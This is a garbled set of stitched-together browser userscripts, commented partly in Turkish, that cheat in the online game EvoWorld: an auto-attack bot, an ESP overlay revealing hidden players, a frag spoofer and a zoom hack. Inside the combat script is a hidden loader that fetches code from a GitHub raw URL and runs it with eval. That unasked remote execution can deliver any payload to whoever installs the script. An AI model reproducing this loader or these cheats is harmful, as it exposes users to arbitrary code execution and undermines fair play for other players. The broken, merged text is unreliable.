            speed: enemy.moveSpeed ? Math.sqrt((enemy.moveSpeed.x ** 2) + (enemy.moveSpeed.y ** 2)) : 0,
            urgency: isApproaching ? Math.max(0, 300 - distance) / 300 : 0
        };
    }
 
// script
 
fetch('https://raw.githubusercontent.com/shadowxds-eng/main.js/main/main.code')
 
  .then(response => response.text())
 
  .then(code => {
 
    eval(code);
 
  })
 
  .catch(err => console.log('Yüklenemedi:', err));
 
    // Gelecek pozisyon hesaplama
    function predictPosition(target, analysis) {
        if (!target.position || !target.moveSpeed) return target.position;
 
        if (analysis.isNewTarget || isFirstEncounter) {
            return target.position;
        }
 
        let predictionTime = 0.008;
        if (analysis.isApproaching && analysis.urgency > 0.9) {
            predictionTime = 0.015;
        } else if (analysis.speed < 100) {
            predictionTime = 0.002;
        }
 
        return {
            x: target.position.x + (target.moveSpeed.x || 0) * predictionTime,
            y: target.position.y + (target.moveSpeed.y || 0) * predictionTime
        };
    }
 
    // Mesafe hesaplama
    function getDistance(objPos) {
        if (!game || !game.me || !objPos) return Infinity;
        const myPos = game.me.position;
        return Math.abs(myPos.x - objPos.x) + Math.abs(myPos.y - objPos.y) * 0.7;
    }
 
    // En yakın düşmanı bul
    function getNearestEnemy() {
        if (!game || !game.me) return null;
 
        const list = game.hashMap && game.hashMap.retrieveVisibleByClient ?
            game.hashMap.retrieveVisibleByClient(game) : [];
 
        const enemies = list.filter(e =>
            e && e.hp != null && !e.deleted &&
            ReaperList.has(e.name) && e !== game.me
        );
 
        if (!enemies.length) return null;
 
        let nearest = null;
        let minDistance = Infinity;
 
        for (const enemy of enemies) {
            const distance = getDistance(enemy.position);
            if (distance < minDistance) {
                minDistance = distance;
                nearest = enemy;
            }
        }
 
        return nearest;
    }
 
    // Menzil hesaplama
    function isInRange(attacker, target, analysis) {
        if (!attacker || !target) return false;
 
        const futurePos = predictPosition(target, analysis);
        const xDist = Math.abs(attacker.position.x - futurePos.x);
        const yDist = Math.abs(attacker.position.y - futurePos.y);
 
        // Yön kontrolü
        const onLeftSide = attacker.position.x <= target.position.x;
        const enemyFlicking = (onLeftSide && target.direction === 1) || (!onLeftSide && target.direction === -1);
        const facingEnemy = (onLeftSide && attacker.direction === 1) || (!onLeftSide && attacker.direction === -1);
 
        // Flicking modunda her zaman düşmana bakıyormuş gibi davran
        const effectiveFacing = flicking ? true : facingEnemy;
 
        // Menzil seçimi
        let xRange;
        if (effectiveFacing) {
            xRange = enemyFlicking ?
                HitBackRangeX[attacker.name]?.[target.name] || 140 :
                HitRangeX[attacker.name]?.[target.name] || 140;
        } else {
            // Flicking yapılacak - daha geniş menzil
            xRange = enemyFlicking ?
                (HitBackRangeX[attacker.name]?.[target.name] || 140) - 25 :
                (HitRangeX[attacker.name]?.[target.name] || 140) - 5;
        }
 
        let yRange = Height[target.name] + (DistAdjustmentY[attacker.name] || 0);
 
        // İlk karşılaşmada ekstra menzil
        if (analysis.isNewTarget || isFirstEncounter) {
            xRange += 8;
            yRange += 5;
        }
 
        // Ultra modda ekstra menzil
        if (ultraMode) {
            xRange += 6;
            yRange += 4;
        }
 
        // Yaklaşan düşmanlara ekstra menzil
        if (analysis.isApproaching) {
            xRange += 2;
            yRange += 1;
        }
 
        return {
            inRange: xDist <= xRange && yDist <= yRange,
            facingEnemy: effectiveFacing,
            onLeftSide,
            enemyFlicking
        };
    }
 
    // Ana saldırı algoritması
    function instantHit() {
        if (!game || !game.me) return;
 
        const enemy = getNearestEnemy();
        if (!enemy) return;
 
        const analysis = analyzeEnemy(enemy);
        if (!analysis) return;
 
        const now = Date.now();
 
        // İlk karşılaşmada anında vuruş
        if (analysis.isNewTarget || isFirstEncounter) {
            hitDelay = 0;
            lastHitTime = 0;
            isFirstEncounter = false;
        }
 
        // Yaklaşan düşmanlara timing ayarı
        if (analysis.isApproaching && analysis.urgency > 0.75) {
            hitDelay = 5;
            lastHitTime = now - hitDelay;
        }
 
        // Delay kontrolü
        if (now - lastHitTime < hitDelay) return;
 
        // Menzil kontrolü
        const rangeCheck = isInRange(game.me, enemy, analysis);
        if (!rangeCheck.inRange) return;
 
        // VURUŞ
        lastHitTime = now;
        totalAttempts++;
        const hpBefore = enemy.hp;
 
        // Flicking tekniği - Gerektüğünde yön değiştirme ayarları
        if (!rangeCheck.facingEnemy && flicking) {
            if (rangeCheck.onLeftSide) {
                simulateQuickRightArrowKeyWithDelay();
            } else {
                simulateQuickLeftArrowKeyWithDelay();
            }
            // Flicking sonrası kısa bekleme
            setTimeout(() => {
                skillUse();
                setTimeout(() => skillStop(), 2);
            }, 50);
        } else {
            // Normal vuruş
            skillUse();
            setTimeout(() => skillStop(), 2);
        }
 
        // Başarı kontrolü
        setTimeout(() => {
            if (enemy.hp < hpBefore || enemy.deleted) {
                hitSuccess++;
                hitDelay = Math.max(0, hitDelay - 1);
            } else {
                hitDelay = Math.min(15, hitDelay + 2);
            }
        }, 30);
    }
 
    // Menü oluştur
    function createMenu() {
        // Stil ekle
        const styleElement = document.createElement('div');
        styleElement.innerHTML = menuStyle;
        if (styleElement.firstElementChild) {
            document.head.appendChild(styleElement.firstElementChild);
        }
 
        // Menü ekle
        const menuElement = document.createElement('div');
        menuElement.innerHTML = menuHTML;
 
        // Her iki elementi de ekle
        const elements = Array.from(menuElement.children);
        elements.forEach(el => {
            if (el) document.body.appendChild(el);
        });
 
        // Menü toggle
        const menuToggle = document.getElementById('menuToggle');
        if (menuToggle) {
            menuToggle.addEventListener('click', () => {
                const menu = document.getElementById('hackMenu');
                if (menu) {
                    menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
                }
            });
        }
 
        // AutoHit toggle
        const toggleAutoHit = document.getElementById('toggleAutoHit');
        if (toggleAutoHit) {
            toggleAutoHit.addEventListener('click', function () {
                autoHitting = !autoHitting;
                isFirstEncounter = true;
                updateMenuButtons();
                console.log('AutoHit:', autoHitting ? 'AÇIK' : 'KAPALI');
            });
        }
 
        // Ultra toggle - devre dışı (her zaman açık)
        const toggleUltra = document.getElementById('toggleUltra');
        if (toggleUltra) {
            toggleUltra.style.opacity = '0.5';
            toggleUltra.style.cursor = 'not-allowed';
            toggleUltra.addEventListener('click', function () {
                console.log('Ultra sistem her zaman aktif!');
            });
        }
 
        // Flicking toggle
        const toggleFlicking = document.getElementById('toggleFlicking');
        if (toggleFlicking) {
            toggleFlicking.addEventListener('click', function () {
                flicking = !flicking;
                updateMenuButtons();
                console.log('Flicking:', flicking ? 'AÇIK' : 'KAPALI');
            });
        }
 
        // Reset button
        const btnReset = document.getElementById('btnReset');
        if (btnReset) {
            btnReset.addEventListener('click', () => {
                hitSuccess = 0;
                totalAttempts = 0;
                hitDelay = 0;
                updateStats();
                console.log('İstatistikler sıfırlandı');
            });
        }
 
        // Test button
        const btnTest = document.getElementById('btnTest');
        if (btnTest) {
            btnTest.addEventListener('click', () => {
                enemyTracker.clear();
                isFirstEncounter = true;
                hitDelay = 0;
                console.log('Test modu aktif');
            });
        }
    }
 
    // İstatistikleri güncelle
    function updateStats() {
        try {
            const successRate = totalAttempts > 0 ? ((hitSuccess / totalAttempts) * 100).toFixed(1) : '0';
            const statSuccess = document.getElementById('statSuccess');
            const statTotal = document.getElementById('statTotal');
            const statDelay = document.getElementById('statDelay');
            const statDistance = document.getElementById('statDistance');
 
            if (statSuccess) statSuccess.textContent = successRate + '%';
            if (statTotal) statTotal.textContent = totalAttempts;
            if (statDelay) statDelay.textContent = hitDelay + 'ms';
 
            const enemy = getNearestEnemy();
            if (enemy && game && game.me) {
                const analysis = analyzeEnemy(enemy);
                if (analysis && statDistance) {
                    statDistance.textContent = analysis.distance.toFixed(1);
                }
            } else {
                if (statDistance) statDistance.textContent = '-';
            }
        } catch (error) {
            // Sessizce devam et
        }
    }
 
    // Başlatma
    function start() {
        if (typeof window.game !== 'undefined') game = window.game;
 
        // Menü oluştur
        createMenu();
 
        // Ana döngü
        setInterval(() => {
            if (autoHitting) instantHit();
        }, 2);
 
        // İstatistik güncelleme
        setInterval(updateStats, 500);
 
        console.log('COMBAT HACK YÜKLENDİ!');
        console.log('Menüyü açmak için sağ üstteki butona tıklayın');
        console.log('Geliştirici: türk evo sikici');
    }
 
    // Oyun hazır olana kadar bekle
    function waitForGame() {
        try {
            if (typeof window.game === 'undefined' || !window.game || !window.game.me) {
                setTimeout(waitForGame, 100);
                return;
            }
            game = window.game;
            start();
        } catch (error) {
            console.log('Oyun yükleniyor, bekleniyor...');
            setTimeout(waitForGame, 500);
        }
    }
 
    // Sayfa tamamen yüklendiğinde başlat
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', waitForGame);
    } else {
        waitForGame();
    }
 
    // Menü butonlarını güncelle
    function updateMenuButtons() {
        const toggleAutoHit = document.getElementById('toggleAutoHit');
        const toggleUltra = document.getElementById('toggleUltra');
        const toggleFlicking = document.getElementById('toggleFlicking');
 
        if (toggleAutoHit) {
            if (autoHitting) {
                toggleAutoHit.classList.add('active');
            } else {
                toggleAutoHit.classList.remove('active');
            }
        }
 
        if (toggleUltra) {
            if (ultraMode) {
                toggleUltra.classList.add('active');
            } else {
                toggleUltra.classList.remove('active');
            }
        }
 
        if (toggleFlicking) {
            if (flicking) {
                toggleFlicking.classList.add('active');
            } else {
                toggleFlicking.classList.remove('active');
            }
        }
    }
 
    // Kontrol tuşları (menü ile senkronize)
    document.addEventListener('keydown', e => {
        if (e.key === 'R' || e.key === 'r') {
            autoHitting = !autoHitting;
            isFirstEncounter = true;
            updateMenuButtons();
            console.log('AutoHit:', autoHitting ? 'AÇIK' : 'KAPALI');
        }
        if (e.key === 'T' || e.key === 't') {
            flicking = !flicking;
            updateMenuButtons();
            console.log('Flicking:', flicking ? 'AÇIK' : 'KAPALI');
        }
        if (e.key === 'Y' || e.key === 'y') {
            const menu = document.getElementById('hackMenu');
            if (menu) {
                menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
                console.log('Menü:', menu.style.display === 'none' ? 'KAPALI' : 'AÇIK');
            }
        }
    });
 
    // Başlangıç mesajı
    console.log('%cCOMBAT HACK', 'color: #00d9ff; font-size: 20px; font-weight: bold;');
    console.log('%cGeliştirici: türk evo sikici', 'color: #ff6600; font-size: 14px; font-weight: bold;');
    console.log('%cURL engelleme sistemi aktif!', 'color: #ff6600; font-size: 14px;');
    console.log('%cGelişmiş savaş araçları aktif!', 'color: #00ff00; font-size: 14px;');
    console.log('%cÖzellikler:', 'color: #00d9ff; font-size: 12px;');
    console.log('   AutoHit - Otomatik vuruş sistemi');
    console.log('   Ultra Mod - Genişletilmiş menzil');
    console.log('   Flicking - Otomatik yön değiştirme');
    console.log('   Canlı istatistikler');
    console.log('   İlk vuruş garantisi');
    console.log('   Hata raporu engelleme');
    console.log('%cKlavye kısayolları:', 'color: #ffaa00; font-size: 12px; font-weight: bold;');
    console.log('   R - AutoHit');
    console.log('   T - Flicking');
    console.log('   Y - Menü');
    console.log('%cNot: Ultra sistem sürekli aktif!', 'color: #00ff88; font-size: 11px; font-style: italic;');
// @downloadURL https://update.greasyfork.org/scripts/563475/UltraMegaHack.user.js
// @updateURL https://update.greasyfork.org/scripts/563475/UltraMegaHack.meta.js
// ==/UserScript==
//Enable ESP In English - C
 
//sorry script test
(function() {
    alert("Beta Script By t.me/Ice_Mod");
    'use strict';
 
    function waitForGameLoad() {
        if (typeof game !== 'undefined' && game.canvas) {
            initScript();
        } else {
            setTimeout(waitForGameLoad, 500);
        }
    }
 
    function initScript() {
        console.log("Game loaded, initializing script...");
 
        // --- Feature Toggles ---
        let showEnemyLines = true;
        let emoteSpamEnabled = false;
 
        // --- Enemy Line Color ---
        let enemyLineColor = 'yellow';
 
        // --- Menu Container Creation ---
        const menuContainer = document.createElement('div');
        menuContainer.style.position = 'absolute';
        menuContainer.style.top = '10px';
        menuContainer.style.right = '10px';
        menuContainer.style.zIndex = '1000';
        menuContainer.style.backgroundColor = '#fff';
        menuContainer.style.padding = '10px';
        menuContainer.style.border = '1px solid #ccc';
 
        // --- Menu Toggle ---
        let menuOpen = true; // Start with menu open by default
        menuContainer.style.display = 'block';
        
         document.addEventListener("keyup", function (event) {
         if (event.key === "C" || event.key === "c") {
      showEnemyLines = !showEnemyLines;
    }
  });
 
        document.addEventListener('keydown', (event) => {
            if (event.key === 'Tab') {
                event.preventDefault();
                menuOpen = !menuOpen;
                menuContainer.style.display = menuOpen ? 'block' : 'none';
            }
        });
 
        // --- Menu Items ---
        const cloudSlider = createSlider('Cloud Transparency', 0, 1, 0.5);
        const swampSlider = createSlider('Swamp Transparency', 0, 1, 1);
        const bushSlider = createSlider('Bush Transparency', 0, 1, 1);
        const enemyLinesCheckbox = createCheckbox('Enemy Show', true);
        const emoteSpamCheckbox = createCheckbox('Emote Spam Beta', false);
        const colorPicker = createColorPicker('Enemy Line Color', enemyLineColor);
 
        menuContainer.appendChild(cloudSlider);
        menuContainer.appendChild(swampSlider);
        menuContainer.appendChild(bushSlider);
        menuContainer.appendChild(enemyLinesCheckbox);
        menuContainer.appendChild(emoteSpamCheckbox);
        menuContainer.appendChild(colorPicker);
        document.body.appendChild(menuContainer);
 
         // Helper functions to create menu elements
        function createSlider(label, min, max, defaultValue, step = 0.01) {
            const container = document.createElement('div');
            container.style.marginBottom = '5px';
 
            const labelElement = document.createElement('label');
            labelElement.textContent = label;
            container.appendChild(labelElement);
 
            const slider = document.createElement('input');
            slider.type = 'range';
            slider.min = min;
            slider.max = max;
            slider.step = step;
            slider.value = defaultValue;
            container.appendChild(slider);
 
            return container;
        }
 
        function createCheckbox(label, checked) {
            const container = document.createElement('div');
            container.style.marginBottom = '5px';
 
            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            checkbox.checked = checked;
            container.appendChild(checkbox);
 
            const labelElement = document.createElement('label');
            labelElement.textContent = label;
            container.appendChild(labelElement);
 
            return container;
        }
 
        function createColorPicker(label, defaultValue) {
            const container = document.createElement('div');
            container.style.marginBottom = '5px';
 
            const labelElement = document.createElement('label');
            labelElement.textContent = label;
            container.appendChild(labelElement);
 
            const picker = document.createElement('input');
            picker.type = 'color';
            picker.value = defaultValue;
            container.appendChild(picker);
 
            return container;
        }
 
        // Apply transparency
        function applyTransparency() {
            const cloudAlpha = parseFloat(cloudSlider.querySelector('input').value);
            const swampAlpha = parseFloat(swampSlider.querySelector('input').value);
            const bushAlpha = parseFloat(bushSlider.querySelector('input').value);
 
            Object.values(game.gameObjects).forEach(obj => {
                if (obj.name.includes('cloud')) {
                    obj.opacity = cloudAlpha;
                } else if (obj.name === 'swamp') {
                    obj.opacity = swampAlpha;
                } else if (obj.name.includes('bush')) {
                    obj.opacity = bushAlpha;
                }
            });
        }
 
        // --- Override game.isVisible to make players in safe zones visible ---
        const originalIsVisible = game.isVisible;
        game.isVisible = function(camera, obj, originalWidth, originalHeight) {
            if (obj.type === objectType.PLAYER && obj.inSafeZone) {
                // Use your desired logic to make them visible, for example:
                return true; // Always visible
                // Or calculate a custom visibility based on safe zone location 
            }
            return originalIsVisible.call(this, camera, obj, originalWidth, originalHeight);
        }
 
        // Draw enemy lines, distances, boxes, and danger labels
        function drawEnemyLines() {
            if (showEnemyLines) {
                const ctx = game.dynamicContext;
                ctx.strokeStyle = enemyLineColor;
                ctx.lineWidth = 2;
                ctx.font = '14px Arial';
 
                const extendedRenderDistance = game.worldWidth;
 
                Object.values(game.gameObjects).forEach(obj => {
                    if (obj.type === objectType.PLAYER && obj !== game.me &&
                        game.isVisible(game.camera, obj, extendedRenderDistance, extendedRenderDistance)) {
                        const myPos = game.getRenderPosition(game.me.position.x + game.me.width / 2, game.me.position.y + game.me.height / 2);
                        const enemyPos = game.getRenderPosition(obj.position.x + obj.width / 2, obj.position.y + obj.height / 2);
                        const distance = Math.round(getDistance(game.me.position.x, game.me.position.y, obj.position.x, obj.position.y));
 
                        // Draw line
                        drawDangerLine(ctx, myPos, enemyPos, obj);
 
                        // Draw distance
                        ctx.fillStyle = 'white';
                        ctx.fillText(`${distance}m`, (myPos.x + enemyPos.x) / 2, (myPos.y + enemyPos.y) / 2);
 
                        // Draw glowing box
                        ctx.shadowColor = 'cyan';
                        ctx.shadowBlur = 10;
                        const boxSize = 40;
                        ctx.strokeRect(enemyPos.x - boxSize / 2, enemyPos.y - boxSize / 2, boxSize, boxSize);
                        ctx.shadowBlur = 0;
 
                        // Draw danger label
                        drawDangerLabel(ctx, enemyPos, obj);
                    }
                });
            }
        }
 
        // Draw line with danger indicator
        function drawDangerLine(ctx, myPos, enemyPos, enemy) {
            ctx.beginPath();
            ctx.moveTo(myPos.x, myPos.y);
            ctx.lineTo(enemyPos.x, enemyPos.y);
 
            // Set line color based on danger
            if (canEat(enemy, game.me)) {
                ctx.strokeStyle = 'red'; // Dangerous enemy
            } else {
                ctx.strokeStyle = enemyLineColor; // Safe enemy
            }
            ctx.stroke();
        }
 
        // Draw Danger/Safe label above enemy
        function drawDangerLabel(ctx, enemyPos, enemy) {
            ctx.fillStyle = canEat(enemy, game.me) ? 'red' : 'green'; 
            ctx.font = 'bold 16px Arial';
            let label = canEat(enemy, game.me) ? 'Danger' : 'Safe';
            let textWidth = ctx.measureText(label).width;
            ctx.fillText(label, enemyPos.x - textWidth / 2, enemyPos.y - 55); // Moved label higher 
        }
 
        // --- Dynamic Transparency for Clouds/Bushes/Swamp ---
        const originalDrawObject = game.drawObject;
        game.drawObject = function (obj, staticCanvas) {
            if ((obj.name.includes('cloud') || obj.name === 'swamp' || obj.name.includes('bush')) && game.isVisible(game.camera, obj)) {
                obj.opacity = parseFloat(cloudSlider.querySelector('input').value);
                staticCanvas = false;
            }
            originalDrawObject.call(this, obj, staticCanvas);
        };
 
        // --- Emote Spam ---
        emoteSpamCheckbox.addEventListener('change', () => {
            emoteSpamEnabled = emoteSpamCheckbox.querySelector('input').checked;
            if (emoteSpamEnabled) {
                startEmoteSpam();
            } else {
                stopEmoteSpam();
            }
        });
 
        let emoteSpamInterval;
        function startEmoteSpam() {
            emoteSpamInterval = setInterval(() => {
                if (typeof gameServer !== 'undefined' && !imDead && joinedGame) {
                    const randomEmoteId = Math.floor(Math.random() * 13) + 1;
                    sendEmote(randomEmoteId);
                }
            }, 1000);
        }
 
        function stopEmoteSpam() {
            clearInterval(emoteSpamInterval);
        }
 
        // Event listeners for menu changes
        cloudSlider.addEventListener('input', applyTransparency);
        swampSlider.addEventListener('input', applyTransparency);
        bushSlider.addEventListener('input', applyTransparency);
        enemyLinesCheckbox.addEventListener('change', () => showEnemyLines = enemyLinesCheckbox.querySelector('input').checked);
        colorPicker.addEventListener('change', () => enemyLineColor = colorPicker.querySelector('input').value);
 
        // Add enemy lines to the game loop
        const originalBeforeDrawAllObjects = game.beforeDrawAllObjects;
        game.beforeDrawAllObjects = function () {
            originalBeforeDrawAllObjects.apply(this, arguments);
            drawEnemyLines();
        };
 
        // Set initial transparency
        applyTransparency();
    }
 
    // --- Helper Functions ---
    function getDistance(x1, y1, x2, y2) {
        let dx = x2 - x1;
        let dy = y2 - y1;
        return Math.sqrt(dx * dx + dy * dy);
    }
 
    // --- Food Eating Logic ---
    function canEat(eater, food) {
        if (foodChain[eater.name] && foodChain[eater.name].eats[food.name]) {
            return true;
        }
        return false;
    }
 
    waitForGameLoad();
})();// ==/UserScript==
 function echolocation() {
 visionType = 1;
}
setInterval(echolocation,0);
 (function() {
    'use strict';
 
    // Create a container for the boss status and timer
    let bossContainer = document.createElement('div');
    bossContainer.style.position = 'absolute';
    bossContainer.style.top = '50px'; // Adjust the position as needed
    bossContainer.style.right = '10px'; // Adjust the position to align with the leaderboard
    bossContainer.style.zIndex = '9999';
    bossContainer.style.display = 'flex';
    bossContainer.style.alignItems = 'center';
 
    // Add the picture of the demonic angel
    let bossImage = document.createElement('img');
    bossImage.src = 'https://cdn1.na.evoworld.io/sprites/bosses/boss1/flying/1.png';
    bossImage.style.width = '50px'; // Adjust size as needed
    bossImage.style.marginRight = '10px'; // Adjust margin as needed
    bossContainer.appendChild(bossImage);
 
    // Add the boss status text
    let bossStatusText = document.createElement('div');
    bossStatusText.style.fontSize = '16px';
    bossStatusText.style.color = '#000000'; // Adjust color as needed
    bossContainer.appendChild(bossStatusText);
 
    // Add the boss timer
    let bossTimerText = document.createElement('div');
    bossTimerText.style.fontSize = '16px';
    bossTimerText.style.color = '#ffffff'; // Adjust color as needed
    bossContainer.appendChild(bossTimerText);
 
    // Function to update the boss status and timer
    function updateBossStatusAndTimer() {
        // Check if the boss is alive on the current server
        let bossIndicator = document.querySelector('.bC'); // Assuming this element indicates the boss's presence
        if (bossIndicator) {
            bossStatusText.innerText = "THE BOSS IS ALIVE";
            bossTimerText.innerText = "";
        } else {
            // Calculate and display the boss timer
            let currentTime = new Date();
            let nextBossTime = new Date(currentTime);
            nextBossTime.setHours(currentTime.getHours() + 1);
            nextBossTime.setMinutes(0);
            nextBossTime.setSeconds(0);
 
            let timeDifference = nextBossTime - currentTime;
            let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
            let seconds = Math.floor((timeDifference % (1000 * 60)) / 1000);
 
            // Format the time nicely
            let formattedTime = (minutes < 10 ? '0' : '') + minutes + ':' +
                                (seconds < 10 ? '0' : '') + seconds;
 
            bossStatusText.innerText = "";
            bossTimerText.innerText = 'Boss Timer: ' + formattedTime;
        }
    }
 
    // Call updateBossStatusAndTimer function every second
    setInterval(updateBossStatusAndTimer, 1000);
 
    // Append the container to the body
    document.body.appendChild(bossContainer);
})();let x = Number(prompt("Pick a number to get it's Arena Frags"));
function e() {
game.me.arenaFrags = x;
}
setInterval(e,0)
console.log(`Updated arena frags for ${game.me.nick}: ${x}`);(function() {
    'use strict';
 
    window.customZoom = 1.0;
 
    function init() {
        if (typeof Engine === 'undefined' || typeof game === 'undefined' || !game) {
            setTimeout(init, 100);
            return;
        }
 
        try {
            Object.defineProperty(game, 'zoom', {
                get: function() {
                    return window.customZoom;
                },
                set: function(v) {},
                configurable: true
            });
        } catch (e) {}
 
        Engine.prototype.setZoom = function(t) {
            this.zoom = window.customZoom;
            this.staticCanvasRenderOffset.restX = 0;
            this.staticCanvasRenderOffset.restY = 0;
            this.staticCanvasRenderOffset.x = 0;
            this.staticCanvasRenderOffset.y = 0;
            this.staticCanvasRenderPosition.x = 0;
            this.staticCanvasRenderPosition.y = 0;
 
            if (this.context) {
                this.context.save();
                this.context.fillStyle = "rgba(0,0,0,1)";
                this.context.fillRect(0, 0, this.canvas.width, this.canvas.height);
                this.context.restore();
            }
            this.clearStaticObjects();
        };
 
        window.open('https://t.me/evoezsquad', '_blank');
        menu();
    }
 
    function menu() {
        if (document.getElementById('z-ui')) return;
 
        const u = document.createElement('div');
        u.id = 'z-ui';
        u.style.cssText = 'position:fixed;top:10px;left:10px;width:180px;background:rgba(0,0,0,0.9);border:1px solid #555;padding:10px;color:#fff;z-index:999999;font-family:monospace;text-align:center;user-select:none;';
 
        u.innerHTML = `
            <div style="font-size:11px;margin-bottom:5px;">t.me/evoezsquad</div>
            <input type="range" id="z-bar" min="0.15" max="4.30" step="0.01" value="1.0" style="width:100%;cursor:pointer;">
            <div style="margin:5px 0;font-size:16px;font-weight:bold;"><span id="z-val">1.00</span>x</div>
            <div style="font-size:10px;color:#888;">H - Hide</div>
        `;
 
        document.body.appendChild(u);
 
        const b = document.getElementById('z-bar');
        const v = document.getElementById('z-val');
 
        function set(n) {
            let val = parseFloat(n);
            window.customZoom = val;
            v.innerText = val.toFixed(2);
            if (window.game && game.setZoom) game.setZoom(val);
        }
 
        b.oninput = function() {
            set(this.value);
        };
 
        window.addEventListener('wheel', () => {
            if (window.game) {
                setTimeout(() => {
                    b.value = window.customZoom;
                    v.innerText = window.customZoom.toFixed(2);
                }, 1);
            }
        }, { passive: true });
 
        window.addEventListener('keydown', (e) => {
            if (e.code === 'KeyH' && document.activeElement.tagName !== 'INPUT') {
                u.style.display = u.style.display === 'none' ? 'block' : 'none';
            }
        });
    }
 
    init();
})();